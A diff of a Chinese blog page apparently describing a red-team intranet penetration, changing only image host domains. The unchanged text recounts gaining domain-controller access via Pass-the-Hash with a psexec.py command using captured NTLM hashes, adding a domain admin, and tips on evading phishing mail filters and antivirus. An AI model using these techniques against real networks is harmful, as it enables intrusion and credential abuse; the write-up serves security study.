-<p><img src="//naykcin.top/2020/09/05/intra-fuck/hashes.png" alt="hashes"></p>
+<p><img src="//mucfo.cn/2020/09/05/intra-fuck/hashes.png" alt="hashes"></p>
 <p>不清楚该用户是什么身份和权限， <code>net user</code> 查看下：</p>
-<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-08%20%E4%B8%8A%E5%8D%8811.36.37.jpg" alt="Screenshot 2020-09-08 上午11.36.37"></p>
+<p><img src="//mucfo.cn/2020/09/05/intra-fuck/Screenshot%202020-09-08%20%E4%B8%8A%E5%8D%8811.36.37.jpg" alt="Screenshot 2020-09-08 上午11.36.37"></p>
 <p>该用户是域管权限，也就是说内部员工曾经以域管账号登录过这台主机，且一直没有重启过。</p>
 <p>功夫不负有心人啊，感觉域控已经在前方招手了。。。</p>
 <h3 id="攻击域控"><a href="#攻击域控" class="headerlink" title="攻击域控"></a>攻击域控</h3><p>已经拿到了域管的 Hash，也已经定位了域内的几台域控，接下来一波 Pass The Hash 攻击应该就可以直接结束战斗了。</p>
@@ -196,7 +196,7 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c:\&gt; python2 .\psexec.py username@IP -hashes LMHASH:NTHASH</span><br></pre></td></tr></table></figure>
 
 <p>不出所料，弹回 session：</p>
-<p><img src="//naykcin.top/2020/09/05/intra-fuck/psexec.png" alt="psexec"></p>
+<p><img src="//mucfo.cn/2020/09/05/intra-fuck/psexec.png" alt="psexec"></p>
 <p>拿下了域控，成功创建了一个新用户并加入了域管理员组，至此内网渗透算是结束。</p>
 <p>其实域内攻击还有很多其他的思路：Kerberosting、CVE-2018-8581 Exchange SSRF、CVE-2020-0688 Exchange RCE 等等，有时候拿到一台主机的权限后，一定要多注意一下这个用户本身的权限、桌面的文件等等，因为很多员工会直接把内网的很多密码直接保存在桌面的某个文件中。</p>
 <p>其次还有 SPN 信息收集、委派、中继、金银票据传递等等，域渗透的知识面实在太广泛了。</p>
@@ -227,7 +227,7 @@
 </ul>
 </blockquote>
 <p>可以发现任意值代替也可以成功弹回 session（测试）：</p>
-<p><img src="//naykcin.top/2020/09/05/intra-fuck/lm.jpg" alt="lm"></p>
+<p><img src="//mucfo.cn/2020/09/05/intra-fuck/lm.jpg" alt="lm"></p>
 <h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>回头看去又是一篇长文，又埋下不少坑需要慢慢填。和防守的同事聊了下，钓鱼邮件对英文邮件检测比较严格，如果邮件带有 test 等的字样，都会被拦截下来，所以前期 fuzz 邮件网关的策略时，最好用中文。</p>
 <p>另外，此次攻击中免杀 CS beacon 上线也屡次失败，被 FireEye 杀了个片甲不留，准备接下来再研究研究基于流量的免杀。</p>
 <h2 id="🌍-参考"><a href="#🌍-参考" class="headerlink" title="🌍 参考"></a>🌍 参考</h2><blockquote>
